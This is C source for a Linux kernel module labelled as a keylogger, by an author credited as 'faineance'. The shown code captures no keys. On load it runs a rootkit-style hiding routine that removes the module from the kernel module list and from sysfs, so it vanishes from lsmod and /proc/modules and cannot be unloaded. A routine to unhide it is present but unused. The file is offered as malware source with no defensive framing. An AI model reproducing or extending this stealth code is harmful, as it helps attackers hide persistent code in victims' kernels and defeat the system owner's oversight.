#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros

#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })

static char module_hidden = 0;

static struct list_head *module_previous;
static struct list_head *module_kobj_previous;
MODULE_LICENSE("GPL");
MODULE_AUTHOR("faineance");
MODULE_DESCRIPTION("A Simple Keylogger module");


void module_hide(void) 
{
	//Remove module from /sys/module which hides it in /proc/modules and lsmod
	//While it is hidden the module cannot be uninstalled.
	if (module_hidden) return;
	//remove from modules list
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	//remove kobjects and store just in case
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = !module_hidden;
}

void module_show(void) 
{
	int result;
	if (!module_hidden) return;
	//readd module
	list_add(&THIS_MODULE->list, module_previous);
	//restoring kobject to it's original place and adding it to /sys/module
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "keyer");
	module_hidden = !module_hidden;
}
static int __init keyer_init(void)
{
    printk(KERN_INFO "Hello world!\n");
    module_hide();
    return 0;    // Non-zero return means that the module couldn't be loaded.
}

static void __exit keyer_cleanup(void)
{
    printk(KERN_INFO "Cleaning up module.\n");
}


module_init(keyer_init);
module_exit(keyer_cleanup);